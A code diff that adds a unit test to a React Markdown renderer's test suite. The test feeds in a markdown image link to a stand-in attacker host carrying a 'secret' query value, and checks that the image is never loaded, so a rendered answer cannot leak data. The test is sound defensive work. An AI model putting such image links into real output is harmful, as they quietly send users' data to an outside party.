@@ -112,4 +112,13 @@ describe('Markdown', () => {
       spy.mockRestore();
     });
   });
+
+  describe('images', () => {
+    it('shows the alt text and never loads the image, so an answer cannot send data out', () => {
+      render(<Markdown>{'See ![a chart](https://attacker.example/x.png?d=secret)'}</Markdown>);
+      expect(document.querySelector('img')).toBeNull();
+      expect(screen.getByTestId('markdown-image-alt')).toHaveTextContent('[a chart]');
+      expect(screen.getByTestId('markdown').innerHTML).not.toContain('attacker.example');
+    });
+  });
 });
